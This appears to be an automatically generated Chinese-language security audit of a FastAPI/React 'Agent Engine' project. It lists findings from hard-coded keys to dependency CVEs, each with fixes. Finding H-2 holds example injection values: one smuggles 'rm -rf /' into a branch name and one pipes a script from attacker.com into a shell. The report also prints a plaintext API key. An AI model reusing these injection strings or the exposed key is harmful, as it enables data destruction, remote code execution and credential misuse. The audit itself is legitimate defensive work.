# Agent Engine 安全审计报告

**扫描日期**: 2026-08-03
**项目路径**: `/workspace/agent-engine`
**项目类型**: Python FastAPI 后端 + React 前端
**审计范围**: 硬编码密钥、SQL 注入、命令注入、路径遍历、XSS、CSRF、认证授权、依赖漏洞

---

## 执行摘要

| 风险等级 | 数量 |
|---------|CRITICAL| 3 |
| HIGH    | 5 |
| MEDIUM  | 6 |
| LOW     | 3 |
| **总计** | **17** |

项目整体安全状况**较差**，存在多个严重安全隐患。最紧迫的问题包括：硬编码 API 密钥、完全缺失的认证体系、以及多处命令执行风险。

---

## 1. 硬编码密钥 / 敏感信息

### C-1: .env 文件中硬编码真实 API 密钥 [CRITICAL]

**位置**: `/workspace/agent-engine/.env`
```env
STEPFUN_API_KEY=5IX2Ibfv3h2WUZG5KKMU1BHFg8fwDnTJ6uETKkKHc9fc7A1s4KOmIaz28t9GjwGop
```

该密钥以明文形式存储在 .env 文件中。如果该文件被提交到版本控制系统或泄露，攻击者可直接获取该密钥访问 StepFun API 服务。

**修复建议**:
- 立即轮换该 API 密钥
- 将 .env 添加到 .gitignore
- 使用环境变量注入或密钥管理服务
- 提供 .env.example 作为模板（已有）

### C-2: APP_SECRET_KEY 每次重启随机生成 [CRITICAL]

**位置**: `app/config.py:20`
```python
app_secret_key: str = Field(default_factory=lambda: secrets.token_hex(32))
```

`app_secret_key` 用于加密存储在数据库中的 API 密钥（通过 Fernet）。由于每次应用重启都会重新随机生成，导致之前加密的 API 密钥全部无法解密。

**修复建议**:
- 从环境变量读取固定密钥：`app_secret_key: str = Field(default="")`
- 在 .env 中设置固定的 `APP_SECRET_KEY`
- 实现密钥轮换机制时保留旧密钥解密能力

---

## 2. 认证授权漏洞

### C-3: 完全缺失认证体系 [CRITICAL]

**位置**: `app/core/auth.py:5-10`
```python
LOCAL_USER_ID = "default-user"

def get_current_user() -> str:
    return LOCAL_USER_ID
```

所有 API 端点均可匿名访问。前端虽然预留了 `Authorization` 请求头逻辑（`api.ts:11-12`），但后端**完全没有实现任何 token 验证逻辑**。任何能访问到服务端口的用户都可以：
- 读取所有会话、消息、文档
- 管理 API 密钥
- 执行代码和命令
- 访问所有用户数据

**修复建议**:
- 实现基于 JWT 或 session 的认证中间件
- 所有端点添加 `Depends(get_current_user)` 并验证 token
- 为多用户场景设计基于角色的访问控制

### H-1: WebSocket 无认证 [HIGH]

**位置**: `app/api/v1/websocket.py:20-34`

WebSocket 端点 `/ws/{session_id}` 和 `/ws/groups/{group_id}` 没有任何认证或授权检查。攻击者可以：
- 监听任意会话的消息
- 向任意群组发送消息
- 获取实时通信内容

**修复建议**:
- 在 WebSocket 连接建立时验证 token（通过 query param 或 header）
- 验证用户是否有权访问指定的 session_id 或 group_id

---

## 3. 命令注入风险

### H-2: Git 命令字符串拼接导致命令注入 [HIGH]

**位置**: `app/skills/builtins.py:405-411`
```python
elif action == "commit":
    cmd = f"git diff --cached --stat && git commit -m '{message or 'chore: update'}'"
elif action == "branch":
    cmd = f"git checkout -b {branch}"
elif action == "merge":
    cmd = f"git merge --no-ff {branch} -m 'merge: {branch}'"
elif action == "rebase":
    cmd = f"git rebase {branch or 'main'}"
```

`branch` 和 `message` 参数直接拼接到 shell 命令中，通过 `create_subprocess_shell` 执行。攻击者可构造：
- `branch = "main; rm -rf /#"` 注入额外命令
- `message = "'; curl attacker.com/shell.sh | sh #"` 实现远程代码执行

**修复建议**:
- 使用 `subprocess.run` 配合列表参数，避免 shell 解析
- 对 `branch` 和 `message` 进行严格的正则白名单校验
- 使用 `shlex.quote()` 转义参数

### M-1: SandboxExecutor 命令执行沙箱绕过风险 [MEDIUM]

**位置**: `app/core/sandbox.py:76-95, 132-143`

虽然实现了安全规则检查，但：
- `shlex.split` 不会防止所有注入方式
- 允许的命令列表包含 `cp`, `mv`, `rm` 等危险命令
- `blocked_patterns` 正则可能被绕过（编码、嵌套命令替换等）
- 沙箱默认**允许网络访问**（`enable_network=False` 但 Proxy 变量仅移除）

**修复建议**:
- 使用 `asyncio.create_subprocess_exec` 而非 shell
- 缩小允许命令列表
- 添加更严格的参数校验

### M-2: 多处 eval/exec 调用 [MEDIUM]

**位置**:
- `app/workflow/engine.py:77` - `eval()`
- `app/workflow/engine.py:110` - `exec()`
- `app/tools/builtins.py:48` - `eval()`
- `app/core/tool_extender.py:282` - `exec()`

尽管所有调用都经过 AST 校验，但 AST 校验本身可能存在绕过（如利用 Python 版本特性、深嵌套等）。

**修复建议**:
- 优先使用 `ast.literal_eval` 替代 `eval`
- 对 workflow 代码实施白名单审批制
- 添加运行时资源限制

---

## 4. SQL 注入风险

### L-1: LIKE 查询通配符注入 [LOW]

**位置**:
- `app/api/v1/documents.py:148`: `pattern = f"%{query}%"`
- `app/core/persistent_memory.py:632`: `ArchivalPassage.text.ilike(f"%{query}%")`

虽然使用了 SQLAlchemy 参数化查询（防止传统 SQL 注入），但用户输入的 `%` 和 `_` 字符会作为 LIKE 通配符解析，可能导致：
- 全表扫描性能问题（输入 `%` 匹配所有行）
- 信息泄露（通过搜索模式推断内容）

**修复建议**:
- 转义 LIKE 通配符：`query.replace("%", "\\%").replace("_", "\\_")`

### L-2: SQLite PRAGMA 使用 f-string [LOW]

**位置**: `app/storage/__init__.py:84`
```python
cursor.execute(f"PRAGMA busy_timeout={settings.sqlite_busy_timeout_ms}")
```

虽然 `sqlite_busy_timeout_ms` 来自配置而非用户输入，但不符合最佳实践。

**修复建议**:
- 使用参数化查询：`cursor.execute("PRAGMA busy_timeout=?", (settings.sqlite_busy_timeout_ms,))`

---

## 5. 路径遍历风险

### M-3: SPA 回退路由可能泄露前端文件 [MEDIUM]

**位置**: `app/main.py:294-299`
```python
@app.get("/{full_path:path}")
async def serve_frontend_spa(request: Request, full_path: str):
    file_path = FRONTEND_DIR / full_path
    if full_path and file_path.exists() and file_path.is_file():
        return FileResponse(file_path)
    return FileResponse(FRONTEND_DIR / "index.html")
```

`FRONTEND_DIR` 路径下如果存在敏感文件（如 `.env`、`.git` 配置、源码 map 等），可能被直接访问。

**修复建议**:
- 限制可访问文件扩展名白名单（.html, .js, .css, .png 等）
- 阻止访问隐藏文件（以 `.` 开头的文件）
- 使用 `os.path.realpath` 验证路径不越界

### M-4: 文件操作未统一使用 PathValidator [MEDIUM]

**位置**: 多处文件操作代码

虽然 `PathValidator` 和 `SandboxMode` 类已实现，但以下模块未使用它们：
- `app/skills/memory_manager.py`
- `app/engine/knowledge.py`
- `app/core/file_patch.py`
- `app/core/session_snapshot.py`

**修复建议**:
- 所有文件操作统一使用 `PathValidator` 或 `SandboxMode`
- 设定工作目录白名单

---

## 6. XSS 风险（前端）

### L-3: react-markdown 渲染用户内容 [LOW]

**位置**: `frontend-react/src/components/chat/MarkdownRenderer.tsx`

前端使用 `react-markdown` 渲染来自后端的 Markdown 内容。react-markdown 默认不会渲染原始 HTML，但需要确认是否配置了 `rehype-raw` 或 `remark-rehype` 等可能允许 HTML 的插件。

**修复建议**:
- 确保不启用 `rehype-raw` 插件
- 对用户输入的 Markdown 内容进行 DOMPurify 清理
- 设置严格的 CSP 头

**注意**: 审计未发现前端代码中使用 `dangerouslySetInnerHTML`，这一点是安全的。

---

## 7. CSRF 防护

### H-3: 完全缺失 CSRF 防护 [HIGH]

**位置**: 全局

项目未实现任何 CSRF 防护机制：
- 没有 CSRF token
- 没有 SameSite Cookie 设置
- 没有 Origin/Referer 校验
- CORS 配置使用白名单但允许 credentials

**修复建议**:
- 实现 Double-Submit Cookie 模式或 Synchronizer Token 模式
- 为 session cookie 设置 `SameSite=Strict`
- 校验 `Origin` 和 `Referer` 头

### H-4: React Router CSRF 绕过漏洞 [HIGH]

**来源**: npm audit - GHSA-qwww-vcr4-c8h2

`react-router-dom@7.18.1` 存在已知 CSRF 漏洞：RSC 模式下 action 可在 400 响应前执行。

**修复建议**:
- 升级 `react-router-dom` 到 >= 8.3.0

---

## 8. 依赖漏洞

### 后端（pip-audit）

| 漏洞 ID | 包名 | 版本 | 严重性 | 描述 |
|---------|------|------|--------|------|
| PYSEC-2026-311 (CVE-2026-45829) | chromadb | 1.5.9 | **CRITICAL** | 预认证代码注入，可远程执行任意代码 |
| PYSEC-2025-49 (CVE-2025-47273) | setuptools | 78.1.0 | HIGH | PackageIndex 路径遍历 |
| PYSEC-2023-228 (CVE-2023-5752) | pip | 23.0.1 | MEDIUM | Mercurial URL 配置注入 |
| PYSEC-2026-196 (CVE-2026-8643) | pip | 23.0.1 | MEDIUM | entry points 路径遍历 |
| PYSEC-2026-1795 (CVE-2025-8869) | pip | 23.0.1 | MEDIUM | tar 提取符号链接检查缺失 |
| PYSEC-2026-1796 (CVE-2026-1703) | pip | 23.0.1 | MEDIUM | wheel 提取路径遍历 |

**关键修复建议**:
- **立即升级 chromadb** 到修复版本
- 升级 pip 到 26.1.2+
- 升级 setuptools 到 78.1.1+

### 前端（npm audit）

| 漏洞 ID | 包名 | 严重性 | 描述 |
|---------|------|--------|------|
| GHSA-qwww-vcr4-c8h2 | react-router-dom | HIGH | RSC Mode CSRF 绕过 |
| GHSA-7mvr-c777-76hp | playwright | HIGH | 浏览器下载不验证 SSL 证书 |
| GHSA-cmwh-pvxp-8882 | dompurify | MODERATE | ALLOWED_ATTR 污染 |
| GHSA-c2j3-45gr-mqc4 | dompurify | LOW | CUSTOM_ELEMENT_HANDLING 绕过 |

**修复建议**:
- 升级 `react-router-dom` 到 >= 8.3.0
- 升级 `playwright` 到 >= 1.55.1
- 升级 `dompurify` 到最新版本

---

## 9. 其他安全问题

### M-5: 全局异常处理泄露堆栈信息 [MEDIUM]

**位置**: `app/main.py:221-223`
```python
async def global_exception_handler(request: Request, exc: Exception):
    dump = write_crash_dump(exc, {"path": request.url.path, "method": request.method})
    logger.error(..., exc_info=True)
```

在生产环境中 `exc_info=True` 和 crash dump 可能泄露内部实现细节。

**修复建议**:
- 生产环境禁用详细错误信息
- 仅返回通用错误消息给客户端

### M-6: 速率限制粒度不足 [MEDIUM]

**位置**: `app/middleware/security.py:76-97`

全局速率限制使用硬编码的 `user_id = "default-user"`，未实现基于 IP 或用户身份的限制。

**修复建议**:
- 实现基于 IP 的速率限制
- 为认证用户提供基于身份的限流

---

## 修复优先级建议

### 第一优先级（立即修复）
1. 轮换并移除 .env 中的硬编码 API 密钥
2. 修复 APP_SECRET_KEY 随机生成问题
3. 实现认证中间件
4. 修复 Git 命令注入漏洞
5. 升级 chromadb

### 第二优先级（本周内修复）
6. 添加 CSRF 防护
7. 实现 WebSocket 认证
8. 升级 React Router
9. 修复 SPA 文件服务路径遍历

### 第三优先级（计划修复）
10. 统一文件操作使用 PathValidator
11. 转义 LIKE 查询通配符
12. 升级 pip 和 setuptools
13. 改善错误处理和速率限制

---

## 附录：扫描工具与方法

| 扫描项 | 工具/方法 |
|--------|----------|
| 硬编码密钥 | grep 正则匹配 |
| SQL 注入 | 代码审查（AST 分析 + 手工审查） |
| 命令注入 | 代码审查（subprocess/shell 使用分析） |
| 路径遍历 | 代码审查（文件操作函数追踪） |
| XSS | 代码审查（React 渲染模式分析） |
| CSRF | 代码审查（中间件和 token 分析） |
| 认证授权 | 代码审查（auth 依赖分析） |
| 后端依赖 | pip-audit |
| 前端依赖 | npm audit |

---

*本报告由自动化代码审查生成，建议结合渗透测试进一步验证。*
